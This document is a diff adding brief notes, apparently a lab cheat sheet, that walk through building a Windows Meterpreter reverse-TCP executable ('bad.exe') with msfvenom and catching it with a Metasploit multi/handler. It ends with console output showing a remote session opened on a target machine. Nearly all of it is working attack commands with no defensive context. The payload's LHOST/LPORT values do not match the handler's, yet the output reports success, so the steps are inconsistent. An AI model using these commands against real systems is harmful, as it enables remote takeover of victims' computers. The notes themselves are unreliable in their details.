@@ -1,0 +1,34 @@
+1 - Generate Payload
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe -o /home/kali/Desktop/bad.exe
+
+or
+
+cd Desktop
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe -o bad.exe
+
+
+2 Execute Payload
+
+msfconsole -q
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+
+
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set LPORT 5555
+LPORT => 5555
+
+msf6 exploit(multi/handler) > set LHOST 192.168.1.112
+LHOST => 192.168.1.112
+
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.112:5555 
+[*] Sending stage (175686 bytes) to 192.168.1.73
+[*] Meterpreter session 1 opened (192.168.1.112:5555 -> 192.168.1.73:64520) at 2023-12-01 00:19:37 -0500
+
